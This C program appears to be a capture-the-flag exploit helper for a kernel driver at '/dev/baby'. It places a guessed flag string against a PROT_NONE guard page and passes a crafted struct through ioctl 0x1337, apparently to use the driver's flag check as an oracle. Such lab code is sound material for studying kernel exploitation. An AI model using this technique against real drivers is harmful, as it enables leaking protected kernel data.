#include <stdio.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
struct _input 
{
	char *flag;
	size_t len;
};
int main(int argc,char *argv[])
{
	int i , fd;
	char *buf;
	struct _input input ;  
	if (argc!=2){
		printf("argc error");
		return -1;
	}
	printf("<= DBG => input : %s len: %d \n",argv[1],strlen(argv[1]));
	mmap(0,0x1000,PROT_NONE,MAP_SHARED|MAP_ANONYMOUS,0,0);
	buf = mmap(0,0x1000,PROT_READ|PROT_WRITE,MAP_SHARED|MAP_ANONYMOUS,0,0);
	mmap(0,0x1000,PROT_NONE,MAP_SHARED|MAP_ANONYMOUS,0,0);
	if(buf>0)
		printf("<= DBG => get a memeroy: %p\n",buf);
	for(i=0 ; i<strlen(argv[1]);i++){
		buf[0x1000 - strlen(argv[1]) + i] = argv[1][i];
		printf("<= DBG => addr: %p content: %c \n", &buf[0x1000 - strlen(argv[1]) + i], argv[1][i] );
	}
	fd = open("/dev/baby",O_RDWR);
	if(fd<0){
		printf("cannot open /dev/baby\n");
//		return -1;
	}
	printf("<= DBG => fd of /dev/baby: %d\n",fd);
	((struct _input * )buf)->len = 33;
	((struct _input * )buf)->flag = (buf+0x1000-strlen(argv[1]));
	printf("<= DBG => input: %p\n",input.flag);	
	ioctl(fd,0x1337,buf);
	close(fd);
}
